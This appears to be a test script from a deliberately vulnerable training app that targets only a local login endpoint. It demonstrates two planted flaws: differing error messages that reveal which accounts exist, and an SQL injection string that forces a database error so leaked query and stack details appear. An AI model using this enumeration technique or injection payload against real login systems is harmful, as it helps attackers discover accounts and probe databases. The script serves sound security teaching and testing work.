// ============================================================================
//  LOCAL, APP-ONLY test case: user-enumeration + verbose-error demonstration
//  against THIS app. Hard-wired to http://127.0.0.1:3000.
//
//  Shows the two planted Task 2 leaks in src/app/api/login/route.ts:
//    [VULN: User enumeration / field disclosure — Task 2]
//    [VULN: Verbose DB/stack errors — Task 2]
//
//  Usage:  node tests/enum-and-verbose.mjs
// ============================================================================
const BASE = "http://127.0.0.1:3000";

async function login(email, password) {
  const res = await fetch(`${BASE}/api/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password }),
  });
  return { status: res.status, body: await res.json() };
}

console.log("1) Unknown email vs known email — the messages differ (enumeration):\n");

const unknown = await login("nobody-here@campus.local", "whatever");
console.log("  unknown email  ->", unknown.status, JSON.stringify(unknown.body));

const known = await login("ada.learner@campus.local", "wrong-password");
console.log("  known email    ->", known.status, JSON.stringify(known.body));

console.log(
  "\n  => Distinct 'No account…' vs 'Incorrect password…' replies confirm the app " +
    "leaks which accounts exist."
);

console.log("\n2) Malformed injection to force a DB error (verbose stack/query leak):\n");
const broken = await login("' AND 1=CAST('x' AS int) -- ", "x");
console.log("  status:", broken.status);
console.log("  body keys:", Object.keys(broken.body));
if (broken.body.stack || broken.body.query) {
  console.log("  => Response includes a raw SQL 'query' and/or 'stack' field:");
  console.log("     query:", broken.body.query);
}
